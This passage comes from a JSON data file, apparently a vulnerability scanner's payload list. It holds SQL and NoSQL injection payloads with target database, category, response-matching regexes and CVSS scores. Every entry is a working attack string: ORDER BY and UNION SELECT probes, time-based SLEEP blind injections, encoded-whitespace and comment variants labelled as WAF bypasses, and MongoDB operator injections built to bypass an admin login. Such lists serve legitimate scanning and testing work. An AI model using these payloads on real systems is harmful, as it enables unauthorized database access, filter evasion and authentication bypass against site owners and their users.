    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 ORDER BY RAND()--",
    "dbms": "MySQL",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "1 ORDER BY FIELD(1,2,3)--",
    "dbms": "MySQL",
    "category": "order_by",
    "matcher": "(?i)(result|row|data|success|welcome)",
    "severity": "HIGH",
    "cvss": "8.1"
  },
  {
    "payload": "' UNION SELECT NULL,NULL,NULL--\r\n",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(null|--|error|column|syntax)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND 1=1--\t",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'%09AND%091=1--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "'%0AAND%0A1=1--",
    "dbms": "Generic",
    "category": "waf_bypass",
    "matcher": "(?i)(welcome|home|dashboard|result|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' OR 1=1 UNION SELECT 1,2,3#",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "(?i)(1|2|3|version|user|result)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "' AND SLEEP/**/({N})--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' AND (1=1) AND SLEEP({N})--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "' OR (SELECT 1 WHERE 1=1 AND SLEEP({N}))--",
    "dbms": "MySQL",
    "category": "waf_bypass",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$regex\": \".*\"}}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(welcome|home|logged in|dashboard|admin)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"$or\": [{\"username\": \"admin\"}, {\"username\": {\"$exists\": true}}]}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(welcome|home|logged in|dashboard|success)",
    "severity": "CRITICAL",
    "cvss": "9.8"
  },
  {
    "payload": "{\"username\": {\"$not\": {\"$size\": 0}}}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(result|data|document|record|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "{\"$where\": \"this.password.length > 0\"}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "(?i)(result|data|document|record|success)",
    "severity": "HIGH",
    "cvss": "8.6"
  },
  {
    "payload": "{\"$where\": \"function() { var x = 0; while(true) { x++; if(x > 100000) break; } return true; }\"}",
    "dbms": "MongoDB",
    "category": "nosql",
    "matcher": "TIME>{N}",
    "severity": "HIGH",
    "cvss": "8.6"
  }
]
